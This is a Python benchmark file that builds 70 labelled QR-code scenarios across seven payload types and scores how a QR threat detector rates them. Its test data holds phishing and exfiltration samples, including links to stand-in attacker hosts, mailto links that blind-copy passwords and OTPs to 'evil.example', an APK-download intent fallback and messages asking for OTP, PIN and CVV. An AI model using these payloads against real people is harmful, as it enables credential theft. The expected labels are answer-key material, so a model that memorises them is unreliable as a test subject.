"""Held-out out-of-distribution (OOD) evaluation benchmark (P1 #7).

Constructs 70 unseen scenarios (10 per payload family across URL, PAYMENT, WIFI,
CONTACT, SMS, EMAIL, DEEP_LINK) using novel organizations, domains, merchant handles,
SSIDs, and context phrasings that do NOT appear in ``rules/synthetic_reference.yaml``.

Evaluates QRShield with ``load_synthetic_reference=False`` to verify out-of-distribution
generalization without synthetic reference tuning.
"""
from __future__ import annotations

import json
import re
from collections import Counter
from pathlib import Path
from typing import Any

from qrshield_core.config import Settings
from qrshield_core.models import Confidence, Context, ContextAttribute
from qrshield_core.pipeline import AnalysisConfig, QRShieldEngine

from .scoring import _matches_expected_assessment

_AMOUNT_RE = re.compile(r"(?:₹|INR|Rs\.?|\$)\s*([0-9]+(?:\.[0-9]{1,2})?)", re.IGNORECASE)
_SSID_RE = re.compile(r"(?:Connect to|Join)\s+([A-Za-z0-9_-]+)", re.IGNORECASE)


def _build_holdout_context(sc: dict[str, Any]) -> Context:
    attrs = [
        ContextAttribute("organization", sc["organization"], "scenario_input", Confidence.HIGH),
        ContextAttribute("purpose", sc["purpose"], "scenario_input", Confidence.HIGH),
    ]
    if sc["payload_type"] == "payment":
        attrs.append(ContextAttribute("merchant", sc["organization"], "scenario_input", Confidence.HIGH))
        m_amt = _AMOUNT_RE.search(sc["purpose"])
        if m_amt:
            attrs.append(ContextAttribute("amount", f"₹{m_amt.group(1)}", "scenario_input", Confidence.HIGH))
    elif sc["payload_type"] == "wifi":
        m_ssid = _SSID_RE.search(sc["purpose"])
        if m_ssid:
            attrs.append(ContextAttribute("ssid", m_ssid.group(1), "scenario_input", Confidence.HIGH))
    return Context(attributes=attrs)


def build_holdout_scenarios() -> list[dict[str, Any]]:
    """Return 70 unseen out-of-distribution scenarios (10 per payload type) grounded in rules R0-R7."""
    scenarios: list[dict[str, Any]] = []

    # 1. URL (10 unseen scenarios)
    url_cases = [
        ("HO-URL-001", "https://verdantvalleyclinic.org/appointments", "Verdant Valley Clinic", "Book your checkup online", "no_material_concern", "benign"),
        ("HO-URL-002", "https://solsticebookshop.co.uk/catalog", "Solstice Bookshop", "Browse our autumn catalogue", "no_material_concern", "benign"),
        ("HO-URL-003", "https://kestrelmuseum.ca/exhibits/audio-guide", "Kestrel Museum", "Listen to the gallery audio tour", "no_material_concern", "benign"),
        ("HO-URL-004", "https://zephyrtransit.metro.org/timetables", "Zephyr Transit Authority", "View live train departures", "no_material_concern", "benign_with_identity_verification"),
        ("HO-URL-005", "https://unknown-billing-portal-99.xyz/pay", "Verdant Valley Clinic", "View appointment schedule", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-URL-006", "https://solstice-books-promo.top/login", "Solstice Bookshop", "Scan for store hours", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-URL-007", "http://198.51.100.77/login?session=reset&token=auth", "Kestrel Museum", "Staff portal login", "needs_verification", "payload_risk_signal"),
        ("HO-URL-008", "https://bit.ly/3UnseenHoldoutLink99", "Zephyr Transit Authority", "Customer feedback form", "needs_verification", "payload_risk_signal"),
        ("HO-URL-009", "http://198.51.100.42:8080/verify-account?redirect=http://evil.example/steal&token=1", "Verdant Valley Clinic", "Pay parking fee", "high_concern", "multi_indicator_risk_signal"),
        ("HO-URL-010", "http://xn--pple-43d.com/login/auth?password_reset=true", "Aurora Credit Union", "Sign in to online banking", "high_concern", "multi_indicator_risk_signal"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in url_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "url", "encoded_payload_type": "url", "scenario_purpose": "url",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 2. PAYMENT (10 unseen scenarios)
    pay_cases = [
        ("HO-PAY-001", "upi://pay?pa=terracottabakery@okaxis&pn=Terracotta%20Bakery&cu=INR", "Terracotta Bakery", "Scan to pay at counter", "no_material_concern", "benign"),
        ("HO-PAY-002", "upi://pay?pa=monsoonroasters@okicici&pn=Monsoon%20Roasters&cu=INR", "Monsoon Roasters", "Pay for coffee order", "no_material_concern", "benign"),
        ("HO-PAY-003", "upi://pay?pa=lotusflorist@oksbi&pn=Lotus%20Florist&am=450.00&cu=INR", "Lotus Florist", "Pay ₹450.00 for bouquet", "no_material_concern", "benign"),
        ("HO-PAY-004", "upi://pay?pa=saffronkitchen@okhdfcbank&pn=Saffron%20Kitchen&am=12500.00&cu=INR", "Saffron Kitchen", "Pay ₹12500.00 catering invoice", "needs_verification", "payload_risk_signal"),
        ("HO-PAY-005", "upi://pay?pa=quickcash991@ybl&pn=Ramesh%20Traders&am=350.00&cu=INR", "Terracotta Bakery", "Pay ₹350.00 for pastries", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-PAY-006", "upi://pay?pa=monsoonroasters@okicici&pn=Monsoon%20Roasters&am=4999.00&cu=INR", "Monsoon Roasters", "Pay ₹250.00 for espresso", "high_concern", "context_mismatch_requires_verification"),
        ("HO-PAY-007", "upi://pay?pa=unknownhandle@unverifiedpsp&pn=Unlisted%20Vendor&am=800.00&cu=INR", "Lotus Florist", "Pay ₹800.00 for flowers", "needs_verification", "payload_risk_signal"),
        ("HO-PAY-008", "upi://pay?pa=refundclaim@okaxis&pn=Cashback%20Dept&am=25000.00&cu=INR&url=http://198.51.100.12/cb", "Terracotta Bakery", "Scan for menu", "high_concern", "multi_indicator_risk_signal"),
        ("HO-PAY-009", "upi://pay?pa=prize_winner@unverifiedpsp&pn=Lottery%20Claim&am=45000.00&cu=INR", "Monsoon Roasters", "Pay ₹180.00 for latte", "high_concern", "multi_indicator_risk_signal"),
        ("HO-PAY-010", "upi://pay?pn=MissingAddressMerchant&am=15000.00&cu=INR", "Lotus Florist", "Pay ₹15000.00", "needs_verification", "payload_risk_signal"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in pay_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "payment", "encoded_payload_type": "payment", "scenario_purpose": "payment",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 3. WIFI (10 unseen scenarios)
    wifi_cases = [
        ("HO-WIFI-001", "WIFI:T:WPA;S:CedarLounge_Guest;P:Cedar2026Guest!;;", "Cedar Lounge", "Connect to CedarLounge_Guest Wi-Fi", "no_material_concern", "benign"),
        ("HO-WIFI-002", "WIFI:T:WPA2;S:BanyanCowork_WiFi;P:BanyanMember#88;;", "Banyan Cowork", "Join BanyanCowork_WiFi network", "no_material_concern", "benign"),
        ("HO-WIFI-003", "WIFI:T:WPA;S:HarborViewHotel;P:WelcomeHarbor99;;", "Harbor View Hotel", "Connect to HarborViewHotel Wi-Fi", "no_material_concern", "benign"),
        ("HO-WIFI-004", "WIFI:T:nopass;S:CedarLounge_Guest;;", "Cedar Lounge", "Connect to CedarLounge_Guest Wi-Fi", "needs_verification", "payload_risk_signal"),
        ("HO-WIFI-005", "WIFI:T:WEP;S:BanyanCowork_WiFi;P:12345;;", "Banyan Cowork", "Join BanyanCowork_WiFi network", "needs_verification", "payload_risk_signal"),
        ("HO-WIFI-006", "WIFI:T:WPA;S:Free_Airport_EvilTwin;P:pass12345;;", "Cedar Lounge", "Connect to CedarLounge_Guest Wi-Fi", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-WIFI-007", "WIFI:T:nopass;S:HarborViewHotel;H:true;;", "Harbor View Hotel", "Connect to HarborViewHotel Wi-Fi", "needs_verification", "payload_risk_signal"),
        ("HO-WIFI-008", "WIFI:T:nopass;S:FREE_BANKING_LOGIN_WIFI;H:true;;", "Cedar Lounge", "View restaurant menu", "high_concern", "multi_indicator_risk_signal"),
        ("HO-WIFI-009", "WIFI:T:WEP;S:Rogue_Hotspot_99;P:abc;H:true;;", "Banyan Cowork", "Pay coworking invoice", "high_concern", "multi_indicator_risk_signal"),
        ("HO-WIFI-010", "WIFI:T:WPA;S:CoralReefCafe_Guest;P:CoralCafe2026!;;", "Coral Reef Cafe", "Connect to CoralReefCafe_Guest Wi-Fi", "no_material_concern", "benign"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in wifi_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "wifi", "encoded_payload_type": "wifi", "scenario_purpose": "wifi",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 4. CONTACT (10 unseen scenarios)
    contact_cases = [
        ("HO-CON-001", "BEGIN:VCARD\nVERSION:3.0\nFN:Dr. Meera Nair\nORG:Verdant Valley Clinic\nTEL:+912240019900\nEMAIL:meera.nair@verdantvalleyclinic.org\nEND:VCARD", "Verdant Valley Clinic", "Save doctor contact card", "no_material_concern", "benign"),
        ("HO-CON-002", "BEGIN:VCARD\nVERSION:3.0\nFN:Arthur Pendelton\nORG:Solstice Bookshop\nTEL:+442079460192\nEMAIL:arthur@solsticebookshop.co.uk\nEND:VCARD", "Solstice Bookshop", "Save store contact details", "no_material_concern", "benign"),
        ("HO-CON-003", "BEGIN:VCARD\nVERSION:3.0\nFN:Elena Rostova\nORG:Kestrel Museum\nTEL:+14165550144\nEMAIL:elena@kestrelmuseum.ca\nEND:VCARD", "Kestrel Museum", "Save curator contact card", "no_material_concern", "benign"),
        ("HO-CON-004", "BEGIN:VCARD\nVERSION:3.0\nFN:Helpdesk Agent\nORG:Foreign Support Corp\nTEL:+919999888877\nEND:VCARD", "Verdant Valley Clinic", "Save clinic reception contact", "needs_verification", "payload_risk_signal"),
        ("HO-CON-005", "BEGIN:VCARD\nVERSION:3.0\nFN:Billing Support\nORG:Offshore Collections Ltd\nTEL:+919876543210\nEMAIL:billing@offshore-collect.xyz\nEND:VCARD", "Verdant Valley Clinic", "Save clinic contact card", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-CON-006", "BEGIN:VCARD\nVERSION:3.0\nFN:Customer Care\nORG:Solstice Bookshop\nTEL:+442079460192\nURL:http://198.51.100.88/phish\nEND:VCARD", "Solstice Bookshop", "Save bookshop contact", "needs_verification", "payload_risk_signal"),
        ("HO-CON-007", "BEGIN:VCARD\nVERSION:3.0\nFN:Bank Security Desk\nORG:Fraud Recovery Unit\nTEL:+919111222333\nEMAIL:urgent@gmail.com\nNOTE:Call immediately to share OTP and unblock card\nEND:VCARD", "Verdant Valley Clinic", "View appointment hours", "high_concern", "multi_indicator_risk_signal"),
        ("HO-CON-008", "BEGIN:VCARD\nVERSION:3.0\nFN:Liam O'Connor\nORG:Harbor View Hotel\nTEL:+16175550188\nEMAIL:concierge@harborviewhotel.com\nEND:VCARD", "Harbor View Hotel", "Save concierge contact card", "no_material_concern", "benign"),
        ("HO-CON-009", "BEGIN:VCARD\nVERSION:3.0\nFN:VIP Support\nORG:Unknown Org\nTEL:+19005559999\nURL:https://bit.ly/3ContactShort\nEND:VCARD", "Harbor View Hotel", "Save hotel front desk contact", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-CON-010", "BEGIN:VCARD\nVERSION:3.0\nFN:Priya Kulkarni\nORG:Banyan Cowork\nTEL:+912067891234\nEMAIL:priya@banyancowork.in\nEND:VCARD", "Banyan Cowork", "Save community manager contact", "no_material_concern", "benign"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in contact_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "contact", "encoded_payload_type": "contact", "scenario_purpose": "contact",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 5. SMS (10 unseen scenarios)
    sms_cases = [
        ("HO-SMS-001", "SMSTO:+912240019900:Hello Verdant Valley Clinic, please confirm my appointment slot.", "Verdant Valley Clinic", "Send SMS to confirm appointment", "no_material_concern", "benign"),
        ("HO-SMS-002", "SMSTO:+442079460192:Hi Solstice Bookshop, please reserve a copy of the new novel.", "Solstice Bookshop", "Send SMS to reserve book", "no_material_concern", "benign"),
        ("HO-SMS-003", "SMSTO:+14165550144:Hello Kestrel Museum, requesting wheelchair access for Saturday.", "Kestrel Museum", "Send SMS for accessibility assistance", "no_material_concern", "benign"),
        ("HO-SMS-004", "SMSTO:+919999111222:Send my OTP code and PIN to verify account immediately", "Verdant Valley Clinic", "Send SMS to confirm appointment", "high_concern", "payload_risk_signal"),
        ("HO-SMS-005", "SMSTO:59999:WIN PRIZE CLAIM CASHBACK NOW", "Solstice Bookshop", "Send SMS to reserve book", "needs_verification", "payload_risk_signal"),
        ("HO-SMS-006", "SMSTO:+918888777666:pay invoice urgent transfer", "Verdant Valley Clinic", "View restaurant menu", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-SMS-007", "SMSTO:+917777666555:URGENT share OTP password and CVV to http://198.51.100.55/verify", "Kestrel Museum", "View museum map", "high_concern", "multi_indicator_risk_signal"),
        ("HO-SMS-008", "SMSTO:+16175550188:Hello Harbor View Hotel, requesting late checkout for Room 402.", "Harbor View Hotel", "Send SMS to front desk", "no_material_concern", "benign"),
        ("HO-SMS-009", "SMSTO:+912067891234:Hi Banyan Cowork, booking Conference Room B for 3pm.", "Banyan Cowork", "Send SMS to book meeting room", "no_material_concern", "benign"),
        ("HO-SMS-010", "SMSTO:54321:FORWARD ALL BANK OTP CODES NOW", "Harbor View Hotel", "Check pool hours", "high_concern", "multi_indicator_risk_signal"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in sms_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "sms", "encoded_payload_type": "sms", "scenario_purpose": "sms",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 6. EMAIL (10 unseen scenarios)
    email_cases = [
        ("HO-EML-001", "mailto:appointments@verdantvalleyclinic.org?subject=Appointment%20Inquiry&body=Hello%20team", "Verdant Valley Clinic", "Email clinic reception", "no_material_concern", "benign"),
        ("HO-EML-002", "mailto:orders@solsticebookshop.co.uk?subject=Book%20Order&body=Please%20hold%20one%20copy", "Solstice Bookshop", "Email bookshop orders desk", "no_material_concern", "benign"),
        ("HO-EML-003", "mailto:info@kestrelmuseum.ca?subject=Group%20Visit&body=Requesting%20guided%20tour%20details", "Kestrel Museum", "Email visitor services", "no_material_concern", "benign"),
        ("HO-EML-004", "mailto:help@offshore-support-desk.xyz?subject=Inquiry&body=Hello", "Verdant Valley Clinic", "Email clinic reception", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-EML-005", "mailto:security@verdantvalleyclinic.org?subject=Password%20Reset&body=Here%20is%20my%20OTP%20and%20password", "Verdant Valley Clinic", "Email clinic reception", "high_concern", "payload_risk_signal"),
        ("HO-EML-006", "mailto:orders@solsticebookshop.co.uk?bcc=dropbox@exfil-tracker.xyz&subject=Order&body=Hi", "Solstice Bookshop", "Email bookshop orders desk", "needs_verification", "payload_risk_signal"),
        ("HO-EML-007", "mailto:claim@lottery-payout-99.top?bcc=audit@exfil.xyz&subject=Urgent%20OTP&body=Send%20OTP%20and%20bank%20PIN%20now", "Kestrel Museum", "View exhibit map", "high_concern", "multi_indicator_risk_signal"),
        ("HO-EML-008", "mailto:concierge@harborviewhotel.com?subject=Airport%20Shuttle&body=Requesting%20pickup", "Harbor View Hotel", "Email hotel concierge", "no_material_concern", "benign"),
        ("HO-EML-009", "mailto:desk@banyancowork.in?subject=Day%20Pass&body=Requesting%20day%20pass%20availability", "Banyan Cowork", "Email coworking desk", "no_material_concern", "benign"),
        ("HO-EML-010", "mailto:verify@198.51.100.99?bcc=leak@evil.example&subject=Credentials&body=My%20password%20and%20OTP%20code", "Harbor View Hotel", "View dining menu", "high_concern", "multi_indicator_risk_signal"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in email_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "email", "encoded_payload_type": "email", "scenario_purpose": "email",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    # 7. DEEP_LINK (10 unseen scenarios)
    dl_cases = [
        ("HO-DL-001", "verdantclinic://check-in?branch=west", "Verdant Valley Clinic", "Open clinic check-in app", "no_material_concern", "benign_with_identity_verification"),
        ("HO-DL-002", "solsticebooks://loyalty?card=member", "Solstice Bookshop", "Open bookshop rewards app", "no_material_concern", "benign_with_identity_verification"),
        ("HO-DL-003", "kestrelguide://tour?hall=north", "Kestrel Museum", "Open museum audio guide app", "no_material_concern", "benign_with_identity_verification"),
        ("HO-DL-004", "sgnl://linkdevice?uuid=unseen99&pub_key=key99", "Verdant Valley Clinic", "View clinic hours", "high_concern", "multi_indicator_risk_signal"),
        ("HO-DL-005", "intent://scan/#Intent;scheme=custompay;package=com.untrusted.sideload;S.browser_fallback_url=http%3A%2F%2F198.51.100.66%2Fapp.apk;end", "Solstice Bookshop", "Browse books", "high_concern", "multi_indicator_risk_signal"),
        ("HO-DL-006", "customwallet://authorize?token=jwt_secret&redirect_uri=http://198.51.100.44/callback", "Kestrel Museum", "Open museum app", "high_concern", "payload_risk_signal"),
        ("HO-DL-007", "harborhotel://room-key?floor=4", "Harbor View Hotel", "Open digital room key in app", "no_material_concern", "benign_with_identity_verification"),
        ("HO-DL-008", "banyancowork://door-access?zone=main", "Banyan Cowork", "Open coworking access app", "no_material_concern", "benign_with_identity_verification"),
        ("HO-DL-009", "tg://resolve?domain=unseen_crypto_pump_99", "Verdant Valley Clinic", "Pay clinic invoice", "needs_verification", "context_mismatch_requires_verification"),
        ("HO-DL-010", "whatsapp://send?phone=919999000011&text=Send%20my%20OTP%20and%20password%20now", "Harbor View Hotel", "View spa menu", "high_concern", "payload_risk_signal"),
    ]
    for sid, qr, org, purp, exp_lvl, cat in dl_cases:
        scenarios.append({
            "scenario_id": sid, "payload_type": "deep_link", "encoded_payload_type": "deep_link", "scenario_purpose": "deep_link",
            "qr_payload": qr, "organization": org, "purpose": purp,
            "expected_category": cat, "expected_assessment": cat, "adjudicated_expected_level": exp_lvl,
        })

    return scenarios


def evaluate_holdout_benchmark(output_dir: Path | None = None) -> dict[str, Any]:
    """Run QRShield on the 70 unseen holdout scenarios with synthetic reference disabled."""
    settings = Settings.from_env()
    settings.load_synthetic_reference = False
    engine = QRShieldEngine(settings, use_default_ocr=False)
    cfg = AnalysisConfig(name="holdout_full_no_synthetic_ref", use_payload=True, use_context=True, use_action=True, threat_intel_mode="off")

    scenarios = build_holdout_scenarios()
    exact_ordinal_matches = 0
    accepted_set_matches = 0
    syntax_matches = 0
    by_type: dict[str, dict[str, int]] = {}
    confusion: dict[str, Counter] = {
        lvl: Counter() for lvl in ("no_material_concern", "needs_verification", "high_concern", "harmful_corroborated")
    }
    records_out: list[dict[str, Any]] = []

    for sc in scenarios:
        ctx = _build_holdout_context(sc)
        res = engine.analyze_payload(sc["qr_payload"], ctx, cfg).to_dict()
        pred_pt = res["payload"]["type"]
        pred_lvl = res["assessment"]["level"]
        exp_lvl = sc["adjudicated_expected_level"]
        exp_cat = sc["expected_category"]
        exp_pt = sc["encoded_payload_type"]

        pt_ok = (pred_pt == exp_pt)
        lvl_ok = (pred_lvl == exp_lvl)
        acc_ok = _matches_expected_assessment(pred_lvl, exp_cat)
        if pt_ok:
            syntax_matches += 1
        if lvl_ok:
            exact_ordinal_matches += 1
        if acc_ok:
            accepted_set_matches += 1
        confusion.setdefault(exp_lvl, Counter())[pred_lvl] += 1

        bucket = by_type.setdefault(exp_pt, {"total": 0, "syntax_agreement": 0, "ordinal_agreement": 0, "accepted_set_agreement": 0})
        bucket["total"] += 1
        if pt_ok:
            bucket["syntax_agreement"] += 1
        if lvl_ok:
            bucket["ordinal_agreement"] += 1
        if acc_ok:
            bucket["accepted_set_agreement"] += 1

        records_out.append({
            **sc,
            "predicted_payload_type": pred_pt,
            "predicted_level": pred_lvl,
            "ordinal_match": lvl_ok,
            "accepted_set_match": acc_ok,
            "trace": res["assessment"]["trace"],
        })

    n = len(scenarios)
    summary = {
        "benchmark": "holdout_ood_v1",
        "synthetic_reference_loaded": False,
        "total_scenarios": n,
        "encoded_syntax_agreement": syntax_matches,
        "encoded_syntax_agreement_rate": round(syntax_matches / n, 4),
        "adjudicated_ordinal_agreement": exact_ordinal_matches,
        "adjudicated_ordinal_agreement_rate": round(exact_ordinal_matches / n, 4),
        "accepted_set_agreement": accepted_set_matches,
        "accepted_set_agreement_rate": round(accepted_set_matches / n, 4),
        "per_payload_type": by_type,
        "confusion_matrix": {k: dict(v) for k, v in confusion.items()},
    }

    if output_dir is not None:
        output_dir.mkdir(parents=True, exist_ok=True)
        (output_dir / "holdout_scenarios.jsonl").write_text(
            "\n".join(json.dumps(s, ensure_ascii=False) for s in scenarios) + "\n",
            encoding="utf-8",
        )
        (output_dir / "holdout_metrics.json").write_text(
            json.dumps({"summary": summary, "results": records_out}, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )

    return summary
